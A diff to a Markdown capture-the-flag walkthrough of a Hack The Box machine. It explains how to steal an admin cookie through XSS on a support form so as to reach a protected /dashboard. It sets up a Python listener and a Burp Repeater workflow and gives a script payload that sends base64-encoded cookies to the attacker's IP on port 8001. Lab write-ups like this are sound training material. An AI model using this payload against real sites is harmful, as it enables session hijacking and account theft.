@@ -45,7 +45,50 @@ gobuster uses the `dir` flag to scan for directories on the `-u` (url flag) on t
 (pic4)
 (pic5)
 
-So to access `http://10.10.11.8:5000/dashboard`we need to be able to login or have admin privileges. A good way to login is to find a login page (and use brute force for example or any additional hits in such login page). Nonetheless, we only have a non-accessible URL. There must be a way to bypass the server and make them think that we are authorized to access the URL. A good way to bypass/trick the server is to give an admin cookie or session id. The differences between admin cookie and session id:
+So to access `http://10.10.11.8:5000/dashboard`we need to be able to login or have admin privileges. A good way to login is to find a login page (and use brute force for example or any additional hits in such login page). Nonetheless, we only have a non-accessible URL. There must be a way to bypass the server and make them think that we are authorized to access the URL. A good way to bypass/trick the server is to give an admin cookie or session id. The differences between admin cookie and session id can be seen in the following URL:
+https://www.tutorialspoint.com/What-is-the-difference-between-session-and-cookies#:~:text=Cookies%20are%20client-side%20files,files%20that%20store%20user%20information.&text=Cookies%20expire%20after%20the%20user,logs%20out%20of%20the%20program.
 
 (pic6)
 
+How can an admin cookie be obtained? A good way to obtain admin cookies is to use a XSS-steal cookie technique. An example can be found in the following URL:
+https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e
+
+Cross-Site Scripting (XSS) is a vulnerability that allows an attacker to inject malicious scripts into web pages. These scripts can run in the context of the victim's browser and can be used for a variety of malicious activities, including stealing cookies. Cookies often store session tokens and other sensitive information, and stealing them can allow an attacker to hijack a user's session, gaining unauthorized access to their account. So that's what we want to access the unauthorized URL `/dashboard`. When an XSS vulnerability is present on a website, an attacker can inject a script that reads the user's cookies and sends them to the attacker’s server. The attacker can then use these cookies to impersonate the user.
+
+For this attack we need the following ingredients:
+
+1. Setting up a server
+2. Configure Burp-suite scanner
+3. Inject the malicious code
+
+##### 1. Setting up the server
+
+The purpose of this step is to set up a server to receive the stolen cookie. Use a basic HTTP server on port 8001 that will log incoming requests. The server listens for incoming HTTP requests. In this attack, it will receive requests containing the victim's cookies. Type in a new CLI:
+
+```
+python3 -m http.server 8001
+```
+
+(pic7)
+
+##### 2. Configure Burp-suite scanner
+
+Open Burp-suite scanner. Click on "Temporary project in memory", "Next", "Use Burp defaults", "Start Burp". Click on `Proxy` tab, then on ìntercept is off` to set it on. You will have an outcome as follows:
+
+(pic10)
+
+Click on "Open browser". A browser will appear on your left. This explorer is designed to interact with Burp-suite so we will use it for the XSS.
+
+(pic11)
+
+Type in the search bar `http://10.10.11.8:5000/support`. You will observe that the page is freezed. This is because Burp-suite is not allowing the packets to continue. To land in the URL click on "Forward" button.
+
+(pic12)
+
+You will see that the URL is reached. Introduce some random data into the webpage. Submit. Check the outcome on the right-hand side. That's all the packet information. Right-click on the packet information and select "send to repeater" so we will be able to try multiple things without recatch the packets each time. Now time to inject the payload. 
+
+```
+<script>var i=new Image(); i.src="http://{IP}:{port}/?cookie="+btoa(document.cookie);</script>
+```
+
+Observe the terms `{IP}:{port}`in the previous command line (CL). The CL is generic and won't work. You have to find your IP address and use the port of the server built in step 1. To know your IP address type in a new terminal `ifconfig` and you must see your personal IP and the IP assigned to your HTB VPN. The IP from the VPN is the one you have to use. In my situation is `10.10.14.108` so my XSS injection is `<script>var i=new Image(); i.src="http://10.10.14.108:8001/?cookie="+btoa(document.cookie);</script>`.
